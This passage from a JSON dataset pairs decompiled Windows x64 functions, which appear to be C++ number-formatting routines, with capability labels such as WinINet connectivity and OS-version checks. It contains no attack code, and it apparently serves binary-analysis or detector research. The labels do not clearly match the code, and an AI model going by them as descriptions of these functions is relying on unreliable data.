== -1;\n                    }\n                    if ((iVar7 == -1) != bVar20) goto code_r0x000140055aa1;\n                    goto code_r0x000140056098;\n                }\n            }\n        }\n        else {\n            uStack145 = uStack145 | uVar19;\n            if (uStack145 != 0) goto code_r0x000140056098;\n            if (iVar16 != 0) {\n                iVar11 = *(aiStack80[0] + -0x18);\n                uVar15 = iVar11 + 1;\n                if (*(aiStack80[0] + -0x10) < uVar15) {\ncode_r0x000140055b87:\n                    fcn.140077810(aiStack80, uVar15);\n                }\n                else {\n                    if (**0x140102a70 == 0) {\n                        iVar16 = *(aiStack80[0] + -8);\n                    }\n                    else {\n                        iVar16 = *(aiStack80[0] + -8);\n                    }\n                    if (0 < iVar16) goto code_r0x000140055b87;\n                }\n                *(aiStack80[0] + *(aiStack80[0] + -0x18)) = cVar5;\n                iVar16 = 0;\n                *(aiStack80[0] + -8) = 0;\n                *(aiStack80[0] + -0x18) = uVar15;\n                *(aiStack80[0] + 1 + iVar11) = 0;\n                uVar19 = 0;\n                goto code_r0x0001400557c9;\n            }\n            fcn.140077920(in_stack_00000038, 0, *(*in_stack_00000038 + -0x18), 0);\n            uVar19 = 0;\n        }\ncode_r0x00014005583a:\n        iVar11 = aiStack80[0];\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140055890;\n        if ((uStack145 == 0) && (uVar19 == 0)) goto code_r0x000140055858;\n    }\ncode_r0x00014005586e:\n    iVar11 = aiStack80[0];\n    cVar5 = fcn.1400b15c0(*(iVar10 + 0x10), *(iVar10 + 0x18), aiStack80);\n    if (cVar5 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\ncode_r0x000140055890:\n    *arg1 = uStack104;\n    arg1[1] = uStack104._4_4_;\n    arg1[2] = uStack96;\n    arg1[3] = uStack92;\n    fcn.140075fa0(iVar11 + -0x18);\n    return arg1;\n}\n",
        "token_count": 6076
    },
    "14005779": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.140057790(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    ulong arg4_00;\n    ulong arg3_00;\n    int32_t iVar5;\n    int64_t iVar6;\n    uchar *arg1_00;\n    uint64_t arg2;\n    uchar *puVar7;\n    uchar *arg4_01;\n    char cVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    bool bVar13;\n    bool bVar14;\n    ulong var_8h_2;\n    ulong uStack192;\n    uchar auStack184 [24];\n    ulong uStack160;\n    uint32_t uStack152;\n    ulong uStack144;\n    uchar auStack136 [2];\n    uchar auStack134 [18];\n    uchar auStack116 [20];\n    uint32_t uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    ulong uStack80;\n    ulong var_14h;\n    ulong var_8h;\n    \n    piVar2 = *arg3;\n    piVar3 = arg3[1];\n    uStack92 = noname_4;\n    uStack160 = 0x1400577c8;\n    iVar6 = fcn.140020fc0(arg4 + 0xd0);\n    uVar1 = *(arg4 + 0x18);\n    puVar9 = &stack0xffffffffffffff48;\n    puVar10 = &stack0xffffffffffffff48;\n    arg2 = noname_5;\n    puStack88 = &stack0xffffffffffffff78;\n    uStack96 = uVar1 & 0x4a;\n    bVar13 = uStack96 != 0x40;\n    bVar14 = uStack96 != 8;\n    if ((noname_5 < 1) && (arg2 = -noname_5,  !bVar13 || !bVar14)) {\n        arg2 = noname_5;\n    }\n    arg1_00 = &stack0xffffffffffffff8c;\n    uStack152 = bVar13 && bVar14;\n    uStack80 = CONCAT44(uStack80._4_4_, uVar1);\n    uStack192 = 0x140057822;\n    iVar5 = fcn.1400afca0(arg1_00, arg2, iVar6 + 0x4a, uVar1);\n    iVar12 = iVar5;\n    puVar7 = puStack88 + (0x14 - iVar5);\n    if (*(iVar6 + 0x20) == '\\0') {\n        if (bVar13 && bVar14) goto code_r0x00014005784e;\ncode_r0x00014005798b:\n        arg4_01 = puVar7;\n        if (((uStack80 & 0x200) != 0) && (noname_5 != 0)) {\n            if (uStack96 == 0x40) {\n                iVar5 = iVar5 + 1;\n                arg4_01 = puVar7 + -1;\n                *arg4_01 = *(iVar6 + 0x4e);\n            }\n            else {\n                iVar5 = iVar5 + 2;\n                arg4_01 = puVar7 + -2;\n                puVar7[-1] = *(iVar6 + 0x4c + (uStack80 >> 0xe & 1));\n                *arg4_01 = *(iVar6 + 0x4e);\n            }\n        }\ncode_r0x000140057860:\n        iVar12 = *(arg4 + 0x10);\n        iVar11 = iVar5;\n        puVar9 = puVar10;\n        if (iVar12 <= iVar11) goto code_r0x00014005786c;\n    }\n    else {\n        puStack88 = puStack88 & 0xffffffff00000000 | uStack80 & 0xffffffff;\n        uStack192 = 0x140057940;\n        iVar11 = fcn.14000e880(arg1_00);\n        cVar8 = *(iVar6 + 0x49);\n        arg4_00 = *(iVar6 + 0x18);\n        iVar11 = -iVar11;\n        puVar9 = &stack0xffffffffffffff48 + iVar11;\n        puVar10 = &stack0xffffffffffffff48 + iVar11;\n        arg3_00 = *(iVar6 + 0x10);\n        *(&stack0xffffffffffffff70 + iVar11) = puVar7 + iVar12;\n        *(&stack0xffffffffffffff68 + iVar11) = puVar7;\n        uStack80 = &stack0xffffffffffffff7a + iVar11;\n        *(&stack0xffffffffffffff40 + iVar11) = 0x140057971;\n        iVar5 = fcn.1400b0000(&stack0xffffffffffffff7a + iVar11, cVar8, arg3_00, arg4_00);\n        iVar5 = iVar5 - uStack80;\n        arg1_00 = uStack80;\n        puVar7 = uStack80;\n        uStack80._0_4_ = puStack88;\n        if (!bVar13 || !bVar14) goto code_r0x00014005798b;\ncode_r0x00014005784e:\n        puVar10 = puVar9;\n        if (noname_5 < 0) {\n            iVar5 = iVar5 + 1;\n            puVar7[-1] = *(iVar6 + 0x4a);\n            arg4_01 = puVar7 + -1;\n            goto code_r0x000140057860;\n        }\n        arg4_01 = puVar7;\n        if ((uStack80 & 0x800) == 0) goto code_r0x000140057860;\n        iVar12 = *(arg4 + 0x10);\n        arg4_01 = puVar7 + -1;\n        iVar11 = iVar5 + 1;\n        *arg4_01 = *(iVar6 + 0x4b);\n        if (iVar12 <= iVar11) goto code_r0x00014005786c;\n    }\n    *(puVar9 + -8) = 0x1400578d8;\n    iVar6 = fcn.14000e880(arg1_00);\n    iVar6 = -iVar6;\n    *(puVar9 + iVar6 + 0x28) = iVar11;\n    iVar11 = iVar12;\n    *(puVar9 + iVar6 + 0x20) = iVar12;\n    *(puVar9 + iVar6 + -8) = 0x140057901;\n    fcn.14009c140(arg4, uStack92, puVar9 + iVar6 + 0x30, arg4_01);\n    arg4_01 = puVar9 + iVar6 + 0x30;\n    puVar9 = puVar9 + iVar6;\ncode_r0x00014005786c:\n    *(arg4 + 0x10) = 0;\n    cVar8 = piVar3;\n    if (cVar8 == '\\0') {\n        pcVar4 = *(*piVar2 + 0x60);\n        *(puVar9 + -8) = 0x140057888;\n        iVar6 = (*pcVar4)(piVar2, arg4_01, iVar11);\n        if (iVar11 != iVar6) {\n            cVar8 = '\\x01';\n        }\n    }\n    *arg1 = piVar2;\n    *(arg1 + 1) = cVar8;\n    return arg1;\n}\n",
        "token_count": 1814
    },
    "1400579e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.1400579e0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    ulong arg4_00;\n    ulong arg3_00;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint64_t arg1_00;\n    uchar *puVar8;\n    uchar *puVar9;\n    char cVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    int64_t iVar13;\n    ulong var_8h_2;\n    ulong uStack176;\n    uchar auStack168 [24];\n    ulong uStack144;\n    uint32_t uStack136;\n    ulong uStack128;\n    uchar auStack120 [20];\n    uchar auStack100 [16];\n    uint32_t uStack84;\n    uint uStack80;\n    char cStack73;\n    ulong var_8h;\n    \n    piVar2 = *arg3;\n    piVar3 = arg3[1];\n    uStack80 = noname_4;\n    uStack144 = 0x140057a14;\n    iVar6 = fcn.140020fc0(arg4 + 0xd0);\n    uVar1 = *(arg4 + 0x18);\n    puVar11 = &stack0xffffffffffffff58;\n    puVar12 = &stack0xffffffffffffff58;\n    uStack84 = uVar1 & 0x4a;\n    cStack73 = uStack84 != 0x40 && uStack84 != 8;\n    uStack136 = cStack73;\n    uStack176 = 0x140057a5d;\n    iVar5 = fcn.1400afca0(&stack0xffffffffffffff9c, noname_5, iVar6 + 0x4a, uVar1);\n    arg1_00 = iVar5;\n    puVar8 = &stack0xffffffffffffff88 + (0x14 - iVar5);\n    if (*(iVar6 + 0x20) != '\\0') {\n        uStack176 = 0x140057aeb;\n        iVar13 = fcn.14000e880(arg1_00);\n        arg4_00 = *(iVar6 + 0x18);\n        arg3_00 = *(iVar6 + 0x10);\n        iVar13 = -iVar13;\n        puVar11 = &stack0xffffffffffffff58 + iVar13;\n        puVar12 = &stack0xffffffffffffff58 + iVar13;\n        cVar10 = *(iVar6 + 0x49);\n        *(&stack0xffffffffffffff80 + iVar13) = puVar8 + arg1_00;\n        puVar9 = &stack0xffffffffffffff8a + iVar13;\n        *(&stack0xffffffffffffff78 + iVar13) = puVar8;\n        *(&stack0xffffffffffffff50 + iVar13) = 0x140057b17;\n        iVar5 = fcn.1400b0000(puVar9, cVar10, arg3_00, arg4_00);\n        arg1_00 = iVar5 - puVar9;\n        puVar8 = puVar9;\n    }\n    puVar9 = puVar8;\n    if (((cStack73 == '\\0') && (puVar11 = puVar12,  (uVar1 & 0x200) != 0)) && (noname_5 != 0)) {\n        if (uStack84 == 0x40) {\n            arg1_00 = arg1_00 + 1;\n            puVar9 = puVar8 + -1;\n            *puVar9 = *(iVar6 + 0x4e);\n        }\n        else {\n            arg1_00 = arg1_00 + 2;\n            puVar9 = puVar8 + -2;\n            puVar8[-1] = *(iVar6 + 0x4c + (uVar1 >> 0xe & 1));\n            *puVar9 = *(iVar6 + 0x4e);\n        }\n    }\n    iVar6 = *(arg4 + 0x10);\n    iVar13 = arg1_00;\n    puVar8 = puVar9;\n    puVar12 = puVar11;\n    if (iVar13 < iVar6) {\n        *(puVar11 + -8) = 0x140057b7d;\n        iVar7 = fcn.14000e880(arg1_00);\n        iVar7 = -iVar7;\n        puVar12 = puVar11 + iVar7;\n        *(puVar11 + iVar7 + 0x28) = iVar13;\n        puVar8 = puVar11 + iVar7 + 0x30;\n        iVar13 = iVar6;\n        *(puVar11 + iVar7 + 0x20) = iVar6;\n        *(puVar11 + iVar7 + -8) = 0x140057ba6;\n        fcn.14009c140(arg4, uStack80, puVar8, puVar9);\n    }\n    *(arg4 + 0x10) = 0;\n    cVar10 = piVar3;\n    if (cVar10 == '\\0') {\n        pcVar4 = *(*piVar2 + 0x60);\n        *(puVar12 + -8) = 0x140057aae;\n        iVar6 = (*pcVar4)(piVar2, puVar8, iVar13);\n        if (iVar13 != iVar6) {\n            cVar10 = '\\x01';\n        }\n    }\n    *arg1 = piVar2;\n    *(arg1 + 1) = cVar10;\n    return arg1;\n}\n",
        "token_count": 1357
    },
    "140057bd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.140057bd0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, int64_t noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    ulong arg4_00;\n    ulong arg3_00;\n    int32_t iVar5;\n    int64_t iVar6;\n    uchar *arg1_00;\n    uchar *puVar7;\n    uchar *arg4_01;\n    char cVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    bool bVar13;\n    bool bVar14;\n    ulong var_8h_2;\n    ulong uStack208;\n    uchar auStack200 [32];\n    uint32_t uStack168;\n    ulong uStack160;\n    uchar auStack152 [2];\n    uchar auStack150 [38];\n    uchar auStack112 [16];\n    uint32_t uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    ulong uStack80;\n    ulong var_14h;\n    ulong var_8h;\n    \n    puStack88 = &stack0xffffffffffffff68;\n    piVar2 = *arg3;\n    piVar3 = arg3[1];\n    uStack92 = noname_4;\n    uStack160 = 0x140057c08;\n    iVar6 = fcn.140020fc0(arg4 + 0xd0);\n    uVar1 = *(arg4 + 0x18);\n    puVar9 = &stack0xffffffffffffff38;\n    puVar10 = &stack0xffffffffffffff38;\n    uStack96 = uVar1 & 0x4a;\n    bVar13 = uStack96 != 0x40;\n    bVar14 = uStack96 != 8;\n    iVar12 = noname_5;\n    if ((noname_5 < 1) && (iVar12 = -noname_5,  !bVar13 || !bVar14)) {\n        iVar12 = noname_5;\n    }\n    arg1_00 = &stack0xffffffffffffff90;\n    uStack168 = bVar13 && bVar14;\n    uStack80 = CONCAT44(uStack80._4_4_, uVar1);\n    uStack208 = 0x140057c63;\n    iVar5 = fcn.1400afd60(arg1_00, iVar12, iVar6 + 0x4a, uVar1);\n    iVar12 = iVar5;\n    puVar7 = puStack88 + (0x28 - iVar5);\n    if (*(iVar6 + 0x20) == '\\0') {\n        if (bVar13 && bVar14) goto code_r0x000140057c8f;\ncode_r0x000140057dcb:\n        arg4_01 = puVar7;\n        if (((uStack80 & 0x200) != 0) && (noname_5 != 0)) {\n            if (uStack96 == 0x40) {\n                iVar5 = iVar5 + 1;\n                arg4_01 = puVar7 + -1;\n                *arg4_01 = *(iVar6 + 0x4e);\n            }\n            else {\n                iVar5 = iVar5 + 2;\n                arg4_01 = puVar7 + -2;\n                puVar7[-1] = *(iVar6 + 0x4c + (uStack80 >> 0xe & 1));\n                *arg4_01 = *(iVar6 + 0x4e);\n            }\n        }\ncode_r0x000140057ca1:\n        iVar12 = *(arg4 + 0x10);\n        iVar11 = iVar5;\n        puVar9 = puVar10;\n        if (iVar12 <= iVar11) goto code_r0x000140057cad;\n    }\n    else {\n        puStack88 = puStack88 & 0xffffffff00000000 | uStack80 & 0xffffffff;\n        uStack208 = 0x140057d80;\n        iVar11 = fcn.14000e880(arg1_00);\n        cVar8 = *(iVar6 + 0x49);\n        arg4_00 = *(iVar6 + 0x18);\n        iVar11 = -iVar11;\n        puVar9 = &stack0xffffffffffffff38 + iVar11;\n        puVar10 = &stack0xffffffffffffff38 + iVar11;\n        arg3_00 = *(iVar6 + 0x10);\n        *(&stack0xffffffffffffff60 + iVar11) = puVar7 + iVar12;\n        *(&stack0xffffffffffffff58 + iVar11) = puVar7;\n        uStack80 = &stack0xffffffffffffff6a + iVar11;\n        *(&stack0xffffffffffffff30 + iVar11) = 0x140057db1;\n        iVar5 = fcn.1400b0000(&stack0xffffffffffffff6a + iVar11, cVar8, arg3_00, arg4_00);\n        iVar5 = iVar5 - uStack80;\n        arg1_00 = uStack80;\n        puVar7 = uStack80;\n        uStack80._0_4_ = puStack88;\n        if (!bVar13 || !bVar14) goto code_r0x000140057dcb;\ncode_r0x000140057c8f:\n        puVar10 = puVar9;\n        if (noname_5 < 0) {\n            iVar5 = iVar5 + 1;\n            puVar7[-1] = *(iVar6 + 0x4a);\n            arg4_01 = puVar7 + -1;\n            goto code_r0x000140057ca1;\n        }\n        arg4_01 = puVar7;\n        if ((uStack80 & 0x800) == 0) goto code_r0x000140057ca1;\n        iVar12 = *(arg4 + 0x10);\n        arg4_01 = puVar7 + -1;\n        iVar11 = iVar5 + 1;\n        *arg4_01 = *(iVar6 + 0x4b);\n        if (iVar12 <= iVar11) goto code_r0x000140057cad;\n    }\n    *(puVar9 + -8) = 0x140057d18;\n    iVar6 = fcn.14000e880(arg1_00);\n    iVar6 = -iVar6;\n    *(puVar9 + iVar6 + 0x28) = iVar11;\n    iVar11 = iVar12;\n    *(puVar9 + iVar6 + 0x20) = iVar12;\n    *(puVar9 + iVar6 + -8) = 0x140057d41;\n    fcn.14009c140(arg4, uStack92, puVar9 + iVar6 + 0x30, arg4_01);\n    arg4_01 = puVar9 + iVar6 + 0x30;\n    puVar9 = puVar9 + iVar6;\ncode_r0x000140057cad:\n    *(arg4 + 0x10) = 0;\n    cVar8 = piVar3;\n    if (cVar8 == '\\0') {\n        pcVar4 = *(*piVar2 + 0x60);\n        *(puVar9 + -8) = 0x140057cc9;\n        iVar12 = (*pcVar4)(piVar2, arg4_01, iVar11);\n        if (iVar11 != iVar12) {\n            cVar8 = '\\x01';\n        }\n    }\n    *arg1 = piVar2;\n    *(arg1 + 1) = cVar8;\n    return arg1;\n}\n",
        "token_count": 1807
    },
    "140057e2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.140057e20(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, int64_t noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    ulong arg4_00;\n    ulong arg3_00;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint64_t arg1_00;\n    uchar *puVar8;\n    uchar *puVar9;\n    char cVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    int64_t iVar13;\n    ulong var_8h_2;\n    ulong uStack192;\n    uchar auStack184 [32];\n    uint32_t uStack152;\n    ulong uStack144;\n    uchar auStack136 [40];\n    uchar auStack96 [12];\n    uint32_t uStack84;\n    uint uStack80;\n    char cStack73;\n    ulong var_8h;\n    \n    piVar2 = *arg3;\n    piVar3 = arg3[1];\n    uStack80 = noname_4;\n    uStack144 = 0x140057e54;\n    iVar6 = fcn.140020fc0(arg4 + 0xd0);\n    uVar1 = *(arg4 + 0x18);\n    puVar11 = &stack0xffffffffffffff48;\n    puVar12 = &stack0xffffffffffffff48;\n    uStack84 = uVar1 & 0x4a;\n    cStack73 = uStack84 != 0x40 && uStack84 != 8;\n    uStack152 = cStack73;\n    uStack192 = 0x140057e9e;\n    iVar5 = fcn.1400afd60(&stack0xffffffffffffffa0, noname_5, iVar6 + 0x4a, uVar1);\n    arg1_00 = iVar5;\n    puVar8 = &stack0xffffffffffffff78 + (0x28 - iVar5);\n    if (*(iVar6 + 0x20) != '\\0') {\n        uStack192 = 0x140057f2b;\n        iVar13 = fcn.14000e880(arg1_00);\n        arg4_00 = *(iVar6 + 0x18);\n        arg3_00 = *(iVar6 + 0x10);\n        iVar13 = -iVar13;\n        puVar11 = &stack0xffffffffffffff48 + iVar13;\n        puVar12 = &stack0xffffffffffffff48 + iVar13;\n        cVar10 = *(iVar6 + 0x49);\n        *(&stack0xffffffffffffff70 + iVar13) = puVar8 + arg1_00;\n        puVar9 = &stack0xffffffffffffff7a + iVar13;\n        *(&stack0xffffffffffffff68 + iVar13) = puVar8;\n        *(&stack0xffffffffffffff40 + iVar13) = 0x140057f57;\n        iVar5 = fcn.1400b0000(puVar9, cVar10, arg3_00, arg4_00);\n        arg1_00 = iVar5 - puVar9;\n        puVar8 = puVar9;\n    }\n    puVar9 = puVar8;\n    if (((cStack73 == '\\0') && (puVar11 = puVar12,  (uVar1 & 0x200) != 0)) && (noname_5 != 0)) {\n        if (uStack84 == 0x40) {\n            arg1_00 = arg1_00 + 1;\n            puVar9 = puVar8 + -1;\n            *puVar9 = *(iVar6 + 0x4e);\n        }\n        else {\n            arg1_00 = arg1_00 + 2;\n            puVar9 = puVar8 + -2;\n            puVar8[-1] = *(iVar6 + 0x4c + (uVar1 >> 0xe & 1));\n            *puVar9 = *(iVar6 + 0x4e);\n        }\n    }\n    iVar6 = *(arg4 + 0x10);\n    iVar13 = arg1_00;\n    puVar8 = puVar9;\n    puVar12 = puVar11;\n    if (iVar13 < iVar6) {\n        *(puVar11 + -8) = 0x140057fbd;\n        iVar7 = fcn.14000e880(arg1_00);\n        iVar7 = -iVar7;\n        puVar12 = puVar11 + iVar7;\n        *(puVar11 + iVar7 + 0x28) = iVar13;\n        puVar8 = puVar11 + iVar7 + 0x30;\n        iVar13 = iVar6;\n        *(puVar11 + iVar7 + 0x20) = iVar6;\n        *(puVar11 + iVar7 + -8) = 0x140057fe6;\n        fcn.14009c140(arg4, uStack80, puVar8, puVar9);\n    }\n    *(arg4 + 0x10) = 0;\n    cVar10 = piVar3;\n    if (cVar10 == '\\0') {\n        pcVar4 = *(*piVar2 + 0x60);\n        *(puVar12 + -8) = 0x140057eef;\n        iVar6 = (*pcVar4)(piVar2, puVar8, iVar13);\n        if (iVar13 != iVar6) {\n            cVar10 = '\\x01';\n        }\n    }\n    *arg1 = piVar2;\n    *(arg1 + 1) = cVar10;\n    return arg1;\n}\n",
        "token_count": 1351
    },
    "1400580e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1400580e0(int64_t **arg1, int64_t *arg2, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n                  int64_t noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n                  ulong noname_12, ulong noname_13, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    code *pcVar1;\n    int64_t arg2_00;\n    int32_t iVar2;\n    int64_t *arg1_00;\n    char *pcVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    int64_t *piVar6;\n    uchar *puVar7;\n    char cVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    int64_t *piVar12;\n    int64_t *piVar13;\n    int64_t iVar14;\n    int64_t *piVar15;\n    int64_t iVar16;\n    bool bVar17;\n    ulong var_18h_2;\n    ulong var_60h;\n    ulong var_68h;\n    ulong uStack288;\n    uchar auStack280 [32];\n    int64_t aiStack248 [11];\n    int64_t *piStack160;\n    uint uStack148;\n    int64_t *piStack144;\n    int64_t *piStack136;\n    int64_t *piStack128;\n    int32_t iStack116;\n    ulong uStack112;\n    uchar auStack104 [24];\n    ulong var_48h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    piStack128 = *arg3;\n    piStack144 = arg3[1];\n    piVar6 = arg4 + 0xd0;\n    uStack148 = noname_4;\n    aiStack248[1] = 0x140058143;\n    piStack136 = fcn.140020fc0(piVar6);\n    iVar14 = *(arg4 + 8);\n    if (iVar14 < 0) {\n        iVar14 = 6;\n    }\n    aiStack248[1] = 0x140058166;\n    fcn.140078b30(arg4, &stack0xffffffffffffff98);\n    puVar9 = &stack0xfffffffffffffee8;\n    piVar12 = &stack0xffffffffffffff28;\n    if ((*(arg4 + 0x18) & 0x104) == 0x104) {\n        uStack288 = 0x1400583f5;\n        aiStack248[0] = noname_6;\n        uStack112 = fcn.14009f6c0();\n        uStack288 = 0x140058417;\n        puVar7 = &stack0xffffffffffffff90;\n        iVar14 = aiStack248[0];\n        iVar2 = fcn.1400b05f0(&stack0xffffffffffffff90, piVar12, 0x2d, &stack0xffffffffffffff98);\n        iStack116 = iVar2;\n        if (0x2c < iVar2) {\n            uStack288 = 0x140058438;\n            iVar16 = fcn.14000e880(puVar7);\n            iVar16 = -iVar16;\n            puVar9 = &stack0xfffffffffffffee8 + iVar16;\n            *(&stack0xfffffffffffffee0 + iVar16) = 0x140058440;\n            uStack112 = fcn.14009f6c0();\n            piVar12 = &stack0xffffffffffffff28 + iVar16;\n            *(&stack0xffffffffffffff08 + iVar16) = iVar14;\n            *(&stack0xfffffffffffffee0 + iVar16) = 0x140058460;\n            iStack116 = fcn.1400b05f0(&stack0xffffffffffffff90, piVar12, iVar2 + 1, &stack0xffffffffffffff98);\n        }\n    }\n    else {\n        uStack288 = 0x140058187;\n        iVar16 = noname_6;\n        uStack112 = fcn.14009f6c0();\n        aiStack248[1] = iVar16;\n        uStack288 = 0x1400581ae;\n        puVar7 = &stack0xffffffffffffff90;\n        aiStack248[0] = iVar14;\n        iVar16 = aiStack248[1];\n        iVar2 = fcn.1400b05f0(&stack0xffffffffffffff90, piVar12, 0x2d, &stack0xffffffffffffff98);\n        iStack116 = iVar2;\n        puVar9 = &stack0xfffffffffffffee8;\n        if (0x2c < iVar2) {\n            uStack288 = 0x1400582d3;\n            iVar4 = fcn.14000e880(puVar7);\n            iVar4 = -iVar4;\n            puVar9 = &stack0xfffffffffffffee8 + iVar4;\n            *(&stack0xfffffffffffffee0 + iVar4) = 0x1400582db;\n            uStack112 = fcn.14009f6c0();\n            piVar12 = &stack0xffffffffffffff28 + iVar4;\n            *(&stack0xffffffffffffff08 + iVar4) = iVar14;\n            *(&stack0xffffffffffffff10 + iVar4) = iVar16;\n            *(&stack0xfffffffffffffee0 + iVar4) = 0x140058300;\n            iStack116 = fcn.1400b05f0(&stack0xffffffffffffff90, piVar12, iVar2 + 1, &stack0xffffffffffffff98);\n        }\n    }\n    iVar2 = iStack116;\n    iVar16 = iStack116;\n    *(puVar9 + -8) = 0x1400581c7;\n    arg1_00 = fcn.1400b36a0(piVar6);\n    *(puVar9 + -8) = 0x1400581d7;\n    iVar14 = fcn.14000e880(piVar6);\n    iVar14 = -iVar14;\n    puVar10 = puVar9 + iVar14;\n    puVar11 = puVar9 + iVar14;\n    piVar13 = piVar12 + iVar16;\n    piVar15 = puVar9 + iVar14 + 0x40;\n    if (*(arg1_00 + 7) == '\\x01') {\ncode_r0x00014005820e:\n        arg1_00 = piVar6;\n        if (piVar13 != piVar12) {\n            *(puVar9 + iVar14 + -8) = 0x140058221;\n            arg1_00 = piVar15;\n            sub.msvcrt.dll_memcpy(piVar15, piVar12, iVar16);\n        }\n    }\n    else {\n        if (*(arg1_00 + 7) == '\\0') {\n            piStack160 = piVar13;\n            *(puVar9 + iVar14 + -8) = 0x14005847c;\n            piVar6 = arg1_00;\n            fcn.140025400(arg1_00);\n            piVar13 = piStack160;\n        }\n        pcVar1 = *(*arg1_00 + 0x38);\n        if (pcVar1 == 0x140025bc0) goto code_r0x00014005820e;\n        *(puVar9 + iVar14 + -8) = 0x1400584eb;\n        (*pcVar1)();\n    }\n    if (iVar16 == 0) {\n        if (*(piStack136 + 4) == '\\0') goto code_r0x000140058260;\n        pcVar3 = NULL;\ncode_r0x000140058320:\n        *(puVar9 + iVar14 + -8) = 0x14005832e;\n        iVar16 = fcn.14000e880(arg1_00);\n        iVar16 = -iVar16;\n        puVar11 = puVar9 + iVar16 + iVar14;\n        puVar10 = puVar9 + iVar16 + iVar14;\n        piVar6 = puVar9 + iVar16 + iVar14 + 0x40;\n        bVar17 = (*piVar12 - 0x2bU & 0xfd) == 0;\n        piVar12 = piVar6;\n        if (bVar17) {\n            cVar8 = *piVar15;\n            piVar15 = puVar9 + iVar14 + 0x41;\n            iStack116 = iVar2 + -1;\n            *piVar6 = cVar8;\n            piVar12 = puVar9 + iVar16 + iVar14 + 0x41;\n        }\n        iVar4 = piStack136[3];\n        arg2_00 = piStack136[2];\n        *(puVar9 + iVar16 + iVar14 + 0x30) = piVar15;\n        *(puVar9 + iVar16 + iVar14 + 0x20) = pcVar3;\n        *(puVar9 + iVar16 + iVar14 + 0x38) = &stack0xffffffffffffff8c;\n        *(puVar9 + iVar16 + iVar14 + 0x28) = piVar12;\n        *(puVar9 + iVar16 + iVar14 + -8) = 